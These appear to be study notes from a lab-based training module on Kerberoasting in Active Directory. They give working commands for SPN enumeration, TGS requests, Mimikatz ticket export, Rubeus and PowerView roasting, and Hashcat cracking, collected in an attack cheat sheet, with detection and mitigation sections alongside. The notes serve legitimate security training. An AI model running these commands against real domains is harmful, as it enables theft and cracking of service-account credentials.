	## 1. What is Kerberoasting?

**Kerberoasting** is a technique that targets **Kerberos service accounts** in an Active Directory environment.

The basic idea covered in this module is:

> **Find user accounts with Service Principal Names (SPNs) → request their TGS tickets → extract the tickets → convert them into a crackable format → perform offline password cracking.**

The important point is that the attack does **not require the target user's plaintext password** to request a service ticket. The attacker uses an authenticated domain account/session to request a TGS for an SPN associated with a service account.

### Core attack flow

```text
Active Directory
       |
       v
Enumerate SPNs
       |
       v
Find user/service accounts
       |
       v
Request TGS
       |
       v
Ticket stored in memory
       |
       v
Extract TGS
       |
       v
Convert to Hashcat format
       |
       v
Offline password cracking
       |
       v
Recovered service-account password
```

---

# 2. Important Terms

## Kerberos

Kerberos is the authentication protocol commonly used by Active Directory.

The important tickets for this module are:

- **TGT — Ticket Granting Ticket**
    
- **TGS — Ticket Granting Service ticket**
    

For Kerberoasting, the main target is the **TGS**.

---

## SPN — Service Principal Name

An **SPN** identifies a service running under an account.

Examples from the module:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

```text
backupjob/veam001.inlanefreight.local
```

```text
adfsconnect/azure01.inlanefreight.local
```

The module specifically focuses on **user accounts with SPNs**, while computer accounts returned during enumeration are generally ignored for this attack path.

### Common SPN examples

|SPN|Service|
|---|---|
|`MSSQLSvc/...`|Microsoft SQL Server|
|`HTTP/...`|HTTP service|
|`WSMAN/...`|Windows Remote Management|
|`TERMSRV/...`|Remote Desktop|
|`ldap/...`|LDAP|
|Custom SPNs|Organization-specific services|

---

# 3. Why SPNs Matter

An SPN can be associated with a **service account**.

For example:

```text
User:
sqldev

SPN:
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

If an attacker can request a TGS for that service, the resulting ticket can contain material that is useful for **offline password cracking**.

The security issue becomes especially important when:

- The service account has a weak password.
    
- The password has not been changed for a long time.
    
- The account has significant privileges.
    
- RC4 is supported.
    
- The service account is highly privileged.
    

---

# 4. Semi-Manual Kerberoasting

Before automated tools such as **Rubeus**, Kerberoasting could be performed through a more manual process.

The module demonstrates this workflow:

1. Enumerate SPNs using `setspn.exe`.
    
2. Identify interesting user/service accounts.
    
3. Request TGS tickets using PowerShell.
    
4. Extract tickets from memory with Mimikatz.
    
5. Obtain the `.kirbi` ticket.
    
6. Convert the ticket for cracking.
    
7. Prepare the Hashcat format.
    
8. Crack the ticket offline.
    

The module describes this as the older/manual approach and notes that it remains useful when automated tooling is unavailable or blocked.

---

# 5. Enumerating SPNs with setspn.exe

The built-in Windows `setspn.exe` utility can be used to enumerate SPNs.

### Command

```cmd
setspn.exe -Q */*
```

This queries for SPNs across the domain.

Example output includes:

```text
CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433

CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351

CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### What to look for

When reviewing the output, separate:

```text
Computer accounts
```

from:

```text
User/service accounts
```

The module focuses on **user accounts with SPNs**.

---

# 6. Requesting a TGS for a Single User

After identifying an interesting SPN, PowerShell can request a Kerberos ticket.

The module uses:

```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### What happens?

The important operation is:

```text
SPN
 |
 v
KerberosRequestorSecurityToken
 |
 v
TGS request
 |
 v
TGS loaded into current logon session
```

The `KerberosRequestorSecurityToken` class creates a security token and requests a Kerberos TGS for the specified SPN in the current logon session.

---

# 7. Understanding the PowerShell Commands

## Add-Type

```powershell
Add-Type -AssemblyName System.IdentityModel
```

`Add-Type` adds a .NET framework assembly/type to the PowerShell session.

The module explains that:

- `-AssemblyName` specifies the assembly.
    
- `System.IdentityModel` contains relevant security-token classes.
    

---

## New-Object

```powershell
New-Object
```

This creates an instance of a .NET Framework object.

Here it is used with:

```text
System.IdentityModel.Tokens.KerberosRequestorSecurityToken
```

---

# 8. Requesting Tickets for Multiple SPNs

The module also demonstrates combining `setspn.exe` with PowerShell:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
Select-String '^CN' -Context 0,1 |
% {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList $_.Context.PostContext[0].Trim()
}
```

This combines SPN enumeration with ticket requests.

### Important limitation

This approach can request tickets for **computer accounts as well**, which makes it less efficient.

Therefore, manually targeting relevant user/service accounts is generally preferable.

---

# 9. Extracting Tickets with Mimikatz

Once the TGS tickets are loaded into memory, the module uses **Mimikatz** to extract them.

```text
mimikatz # base64 /out:true

mimikatz # kerberos::list /export
```

The extracted ticket contains information such as:

```text
Encryption type : rc4_hmac_nt
Server Name     : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
Client Name     : htb-student @ INLANEFREIGHT.LOCAL
```

The result can be saved as a:

```text
.kirbi
```

file.

---

# 10. `.kirbi` Files

A `.kirbi` file represents an exported Kerberos ticket.

The module demonstrates two approaches:

### Method 1 — Base64 output

```text
Mimikatz
   |
   v
Base64 ticket
   |
   v
Decode
   |
   v
.kirbi
```

### Method 2 — Direct export

If Base64 output is not used, Mimikatz can directly write the ticket to `.kirbi`.

The module notes that this can simplify the process because the `.kirbi` file can be moved to the attack host and processed directly.

---

# 11. Preparing the Base64 Ticket

Because the Base64 output is column-wrapped, the module removes newlines and whitespace.

```bash
echo "<base64 blob>" | tr -d \n
```

The objective is to obtain the complete Base64 data on a single line.

---

# 12. Converting Base64 Back to `.kirbi`

The module then decodes the Base64 data:

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

Now the ticket exists as:

```text
sqldev.kirbi
```

---

# 13. Using kirbi2john.py

The module uses `kirbi2john.py` to extract the Kerberos ticket information:

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This produces:

```text
crack_file
```

The resulting data then needs to be modified into a format Hashcat understands.

---

# 14. Preparing the Hash for Hashcat

The module uses:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

The resulting format begins with:

```text
$krb5tgs$23$*
```

This identifies the ticket as a Kerberos 5 TGS-REP using **etype 23 / RC4**.

---

# 15. Cracking the RC4 TGS Ticket

The module uses Hashcat mode:

```text
13100
```

Command:

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

In the module's example, the ticket is successfully cracked and the password is shown as:

```text
database!
```

The example reports:

```text
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Recovered........: 1/1
```

---

# 16. Important Hashcat Modes

|Kerberos ticket|Encryption|Hashcat mode|
|---|---|--:|
|TGS-REP|RC4 / etype 23|`13100`|
|TGS-REP|AES-128 / etype 17|Covered by Kerberos AES modes|
|TGS-REP|AES-256 / etype 18|`19700`|

The module explicitly identifies `19700` as:

```text
Kerberos 5, etype 18, TGS-REP
(AES256-CTS-HMAC-SHA1-96)
```

---

# 17. Automated Route — PowerView

The manual process is useful for understanding the mechanics, but automated tooling is much faster.

The module introduces **PowerView**.

First:

```powershell
Import-Module .\PowerView.ps1
```

Then enumerate domain users with SPNs:

```powershell
Get-DomainUser * -spn | select samaccountname
```

Example results:

```text
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

---

# 18. Targeting a Specific User with PowerView

The module demonstrates:

```powershell
Get-DomainUser -Identity sqldev |
Get-DomainSPNTicket -Format Hashcat
```

This is useful because PowerView can directly produce the ticket in **Hashcat format**, avoiding much of the manual ticket conversion process.

Conceptually:

```text
Enumerate SPN
      |
      v
Identify account
      |
      v
Get-DomainSPNTicket
      |
      v
Hashcat-formatted TGS
```

---

# 19. Exporting Tickets to CSV

PowerView can also export all discovered tickets:

```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

The CSV contains fields such as:

```text
SamAccountName
DistinguishedName
ServicePrincipalName
TicketByteHexStream
Hash
```

This is useful for organizing multiple Kerberoastable accounts.

---

# 20. Rubeus

**Rubeus** is one of the major tools used for Kerberos interaction from Windows.

The module introduces it as a faster and easier way to perform Kerberoasting.

Basic syntax:

```powershell
Rubeus.exe kerberoast
```

---

# 21. Important Rubeus Options

### Basic Kerberoasting

```powershell
Rubeus.exe kerberoast
```

### Target a specific SPN

```powershell
Rubeus.exe kerberoast /spn:"blah/blah"
```

### Save hashes to a file

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
```

### Use alternate credentials

```powershell
Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD
```

### Use an existing TGT

```powershell
Rubeus.exe kerberoast /ticket:FILE.KIRBI
```

### Request RC4 through tgtdeleg

```powershell
Rubeus.exe kerberoast /usetgtdeleg
```

### Filter for RC4-oriented Kerberoasting

```powershell
Rubeus.exe kerberoast /rc4opsec
```

### Display statistics without requesting tickets

```powershell
Rubeus.exe kerberoast /stats
```

### Filter by `admincount=1`

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1'
```

### Password-set date filtering

```powershell
Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5
```

### Delay and jitter

```powershell
Rubeus.exe kerberoast /delay:5000 /jitter:30
```

### AES Kerberoasting

```powershell
Rubeus.exe kerberoast /aes
```

These options are documented in the module's Rubeus section.

---

# 22. `/nowrap`

One particularly important Rubeus option is:

```text
/nowrap
```

Example:

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

The purpose is to prevent output from being column-wrapped.

That makes the resulting hash easier to copy and use with Hashcat without manually removing whitespace/newlines.

### Remember

```text
/nowrap
```

= cleaner, single-line output.

---

# 23. `/stats`

Before actually requesting tickets, Rubeus can enumerate statistics:

```powershell
Rubeus.exe kerberoast /stats
```

The example shows:

```text
Total kerberoastable users : 9
```

Supported encryption:

```text
RC4_HMAC_DEFAULT                                 7
AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 2
```

Password last-set information is also displayed.

### Why `/stats` matters

It allows you to understand the target environment **before generating ticket requests**.

Useful information includes:

- Number of Kerberoastable accounts.
    
- Encryption types.
    
- Password age.
    
- Potentially interesting account attributes.
    

---

# 24. Prioritizing Accounts

The module demonstrates filtering for:

```text
admincount=1
```

Command:

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

In the example:

```text
Total kerberoastable users : 3
```

One displayed target is:

```text
SamAccountName     : backupagent
SPN                : backupjob/veam001.inlanefreight.local
Supported ETypes   : RC4_HMAC_DEFAULT
```

The important lesson is:

> **Not every Kerberoastable account has equal impact. Account privileges and password strength matter.**

---

# 25. Encryption Types

Kerberos can use different encryption types.

The module focuses heavily on:

```text
RC4
AES128
AES256
```

### RC4

Kerberoasting commonly produces:

```text
$krb5tgs$23$*
```

The `23` indicates **etype 23 / RC4-HMAC**.

### AES-256

AES-256 TGS hashes commonly begin with:

```text
$krb5tgs$18$*
```

This corresponds to:

```text
etype 18
```

---

# 26. RC4 vs AES

The module emphasizes that RC4 is generally much easier/faster to crack offline than AES.

Conceptually:

```text
RC4
  |
  +--> weaker / faster cracking
  |
  +--> $krb5tgs$23$*

AES-256
  |
  +--> stronger / slower cracking
  |
  +--> $krb5tgs$18$*
```

The module states that AES-128 and AES-256 tickets can still potentially be cracked when weak passwords are used, but cracking them is significantly more time-consuming than RC4.

---

# 27. `msDS-SupportedEncryptionTypes`

This Active Directory attribute helps determine which Kerberos encryption types an account supports.

The module demonstrates:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

For one example:

```text
msds-supportedencryptiontypes : 0
```

The module explains that a value of `0` means the specific encryption type is not explicitly defined and defaults to RC4-HMAC-MD5 in the demonstrated environment.

Later, the example changes the value to:

```text
24
```

which represents AES 128/256 support in the demonstrated configuration.

---

# 28. RC4 Example

The module creates an SPN account:

```text
testspn
```

SPN:

```text
testspn/kerberoast.inlanefreight.local
```

Rubeus:

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

The output shows:

```text
Supported ETypes : RC4_HMAC_DEFAULT
```

and a hash beginning:

```text
$krb5tgs$23$
```

The module then uses:

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

The example reports the password was cracked quickly because it was a weak password present in `rockyou.txt`.

---

# 29. AES-256 Example

The module then changes the example account so that it supports AES 128/256.

PowerView reports:

```text
msds-supportedencryptiontypes : 24
```

Rubeus now returns:

```text
Supported ETypes :
AES128_CTS_HMAC_SHA1_96,
AES256_CTS_HMAC_SHA1_96
```

The resulting hash starts with:

```text
$krb5tgs$18$
```

---

# 30. Cracking AES-256 with Hashcat

Hashcat mode:

```text
19700
```

Command:

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

The module demonstrates checking the running status using:

```text
s
```

Hashcat reports:

```text
Status...........: Running
Hash.Name........: Kerberos 5, etype 18, TGS-REP
```

The example eventually reports:

```text
Status...........: Cracked
```

with approximately:

```text
4 minutes 36 seconds
```

on the example CPU for the relatively simple password.

---

# 31. `/tgtdeleg`

Rubeus provides:

```text
/tgtdeleg
```

The module describes this as a way to request an RC4-encrypted service ticket in environments where the account otherwise supports AES, subject to the Domain Controller behavior discussed in the module.

Example:

```powershell
Rubeus.exe kerberoast /usetgtdeleg /nowrap
```

The important concept is:

```text
AES-capable account
       |
       v
/tgtdeleg
       |
       v
RC4 ticket requested
       |
       v
Potentially faster offline cracking
```

---

# 32. Windows Server 2019 Limitation

**Important module note:**

The `/tgtdeleg` downgrade behavior described above does **not work against a Windows Server 2019 Domain Controller** in the demonstrated scenario.

The module states that a Server 2019 DC returns a service ticket encrypted with the highest encryption level supported by the target account.

Therefore:

```text
Older DC behavior
      |
      v
AES account may still allow RC4 request

Server 2019 DC
      |
      v
Highest supported encryption returned
```

This distinction is important when interpreting Kerberoasting results.

---

# 33. Kerberos Encryption Policy

The module describes the Group Policy location for configuring Kerberos encryption types:

```text
Computer Configuration
    >
Policies
    >
Windows Settings
    >
Security Settings
    >
Local Policies
    >
Security Options
    >
Network security: Configure encryption types allowed for Kerberos
```

The module warns that removing AES support would introduce a security weakness and should not be done simply to enable RC4-based behavior.

It also notes that removing RC4 can have operational impacts and should be thoroughly tested.

---

# 34. Mitigation

The module recommends several defensive measures.

## Strong service-account passwords

For unmanaged service accounts:

- Use long passwords.
    
- Use complex passwords/passphrases.
    
- Avoid passwords found in common wordlists.
    
- Avoid predictable passwords.
    

The objective is to make offline cracking impractical.

---

# 35. Managed Service Accounts

The module recommends:

### MSA

**Managed Service Accounts**

### gMSA

**Group Managed Service Accounts**

These accounts can use highly complex passwords and automatically rotate them.

The module specifically recommends MSA/gMSA over manually managed service-account passwords where appropriate.

---

# 36. Avoid Highly Privileged SPN Accounts

A particularly important defensive recommendation is:

> Highly privileged accounts such as Domain Admins should not be used as SPN accounts when avoidable.

The reason is straightforward:

```text
Kerberoastable account
        +
Weak password
        +
High privileges
        =
High-impact compromise
```

The module explicitly recommends avoiding Domain Admin and other highly privileged accounts as SPN accounts.

---

# 37. Detection

Kerberoasting can generate abnormal Kerberos traffic.

The module highlights:

```text
TGS-REQ
TGS-REP
```

A Kerberoasting attack can generate an unusually high number of these requests.

---

# 38. Audit Kerberos Service Ticket Operations

Domain Controllers can be configured to audit Kerberos service-ticket requests.

The module refers to:

```text
Audit Kerberos Service Ticket Operations
```

Relevant Windows Security Event IDs:

### Event ID 4769

```text
A Kerberos service ticket was requested.
```

### Event ID 4770

```text
A Kerberos service ticket was renewed.
```

---

# 39. Detecting Abnormal 4769 Activity

The module notes that approximately:

```text
10–20 TGS requests
```

for a given account can be normal depending on the environment.

However, a large number of:

```text
Event ID 4769
```

from one account within a short period can indicate suspicious activity.

### Detection concept

```text
Normal:
User
 |
 +--> occasional TGS requests

Suspicious:
User
 |
 +--> many TGS requests
       in a short period
              |
              v
       Investigate Kerberoasting
```

---

# 40. Example Event 4769

The module's example shows:

```text
Requester:
htb-student

Target:
sqldev

Encryption:
0x17
```

The module interprets `0x17` as decimal `23`, corresponding to RC4 in this context.

This is useful because the event can reveal:

- Who requested the ticket.
    
- Which service/account was targeted.
    
- Which encryption type was used.
    

---

# 41. Kerberoasting Cheat Sheet

## Enumeration

```cmd
setspn.exe -Q */*
```

## PowerShell TGS request

```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
-ArgumentList "SPN"
```

## Mimikatz

```text
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

## Remove Base64 line breaks

```bash
echo "<base64 blob>" | tr -d \n
```

## Decode Base64

```bash
cat encoded_file | base64 -d > ticket.kirbi
```

## Convert `.kirbi`

```bash
python2.7 kirbi2john.py ticket.kirbi
```

## Prepare RC4 Hashcat format

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat
```

## RC4 TGS cracking

```bash
hashcat -m 13100 tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## PowerView

```powershell
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname
```

## Target specific account

```powershell
Get-DomainUser -Identity USER |
Get-DomainSPNTicket -Format Hashcat
```

## Export

```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

## Rubeus

```powershell
Rubeus.exe kerberoast
```

## Statistics

```powershell
Rubeus.exe kerberoast /stats
```

## Clean output

```powershell
Rubeus.exe kerberoast /nowrap
```

## Filter admincount

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## AES

```powershell
Rubeus.exe kerberoast /aes /nowrap
```

## RC4/tgtdeleg behavior

```powershell
Rubeus.exe kerberoast /usetgtdeleg /nowrap
```

## AES-256 Hashcat

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

---

# 42. Important Values to Memorize

|Item|Value|
|---|---|
|Kerberos TGS-REP RC4|**etype 23**|
|RC4 Hashcat mode|**13100**|
|Kerberos TGS-REP AES-256|**etype 18**|
|AES-256 Hashcat mode|**19700**|
|RC4 hash prefix|**`$krb5tgs$23$`**|
|AES-256 hash prefix|**`$krb5tgs$18$`**|
|TGS request event|**4769**|
|TGS renewal event|**4770**|
|SPN enumeration|**`setspn.exe -Q */*`**|
|Rubeus statistics|**`/stats`**|
|Rubeus clean output|**`/nowrap`**|
|Admin account filter|**`admincount=1`**|
|PowerView SPN enumeration|**`Get-DomainUser * -spn`**|

---

# 43. Attack Method Comparison

|Method|Main Tools|Advantage|Limitation|
|---|---|---|---|
|Semi-manual|`setspn`, PowerShell, Mimikatz|Understands the underlying process|More steps|
|PowerView|PowerView|Automates enumeration and ticket extraction|Requires PowerView|
|Rubeus|Rubeus|Fast and feature-rich|Tool may be blocked/detected|
|Offline cracking|Hashcat|No further interaction with target required|Depends heavily on password strength|

---

# 44. Manual vs Automated Workflow

### Semi-manual

```text
setspn
  ↓
Find SPN
  ↓
PowerShell
  ↓
Request TGS
  ↓
Mimikatz
  ↓
.kirbi
  ↓
kirbi2john
  ↓
sed
  ↓
Hashcat
```

### PowerView

```text
PowerView
   ↓
Get-DomainUser
   ↓
Get-DomainSPNTicket
   ↓
Hashcat format
   ↓
Hashcat
```

### Rubeus

```text
Rubeus
   ↓
Kerberoast
   ↓
Hashcat-format TGS
   ↓
Hashcat
```

The module emphasizes that automated methods are generally faster during time-limited assessments, while understanding the manual process is valuable when tools fail or are blocked.

---

# 45. What Makes an Account Interesting?

During enumeration, pay attention to:

### 1. SPN exists

```text
servicePrincipalName = *
```

### 2. User/service account

Focus on accounts representing services rather than ordinary computer objects.

### 3. High privileges

For example:

```text
admincount=1
```

### 4. Weak encryption

Especially:

```text
RC4 / etype 23
```

### 5. Old password

A password that has not been changed for a long time can be interesting.

### 6. Weak password

If the password is present in common dictionaries, offline cracking becomes much easier.

### 7. Sensitive service

Examples include:

```text
MSSQL
Backup
Monitoring
ADFS
```

---

# 46. Complete Mental Model

The most important thing to understand is **not the individual commands** but the relationship between the objects:

```text
                    ACTIVE DIRECTORY
                          |
                          |
                    User Account
                          |
                     has an SPN
                          |
                          v
             Service Principal Name
                          |
                          v
                 Kerberos TGS Request
                          |
                          v
                     TGS Ticket
                          |
                +---------+---------+
                |                   |
             RC4 23              AES 18
                |                   |
                v                   v
          Hashcat 13100        Hashcat 19700
                |                   |
                +---------+---------+
                          |
                          v
                  Offline Cracking
                          |
                          v
                Service Account
                   Credentials
```

---

# 47. The Core Lesson

**Kerberoasting is fundamentally an abuse of service-account authentication combined with offline password cracking.**

The attacker does not need to directly compromise the service account first.

Instead:

```text
SPN discovery
      ↓
TGS request
      ↓
Ticket extraction
      ↓
Offline cracking
      ↓
Potential credential recovery
```

The risk is especially significant when:

```text
Service account
+
SPN
+
Weak password
+
High privileges
```

are combined.

---

# 48. Defensive Mental Model

From the defender's perspective:

```text
Reduce Attack Surface
        |
        +--> Strong service-account passwords
        |
        +--> MSA / gMSA
        |
        +--> Avoid privileged SPN accounts
        |
        +--> Restrict legacy encryption
        |
        +--> Monitor TGS requests
        |
        +--> Monitor Event ID 4769
        |
        +--> Investigate abnormal request bursts
```

The module's main mitigation recommendations are strong/complex service-account passwords, MSA/gMSA, restricting RC4 where operationally appropriate, avoiding highly privileged SPN accounts, and monitoring Kerberos service-ticket activity.

---

# 49. Final Revision Notes

### Remember these five things first:

**1. SPN**

```text
Service Principal Name
```

Identifies a service associated with an account.

**2. TGS**

```text
Ticket Granting Service ticket
```

This is the ticket targeted by Kerberoasting.

**3. RC4**

```text
etype 23
$krb5tgs$23$
Hashcat: 13100
```

**4. AES-256**

```text
etype 18
$krb5tgs$18$
Hashcat: 19700
```

**5. Detection**

```text
Event ID 4769
```

A large burst of service-ticket requests can be suspicious depending on the environment.

---

# 50. One-Line Workflow to Memorize

```text
Enumerate SPNs → Identify service accounts → Request TGS → Extract ticket → Convert to hash → Crack offline → Assess recovered credentials
```

That is the central workflow of the **Kerberoasting from Windows** module.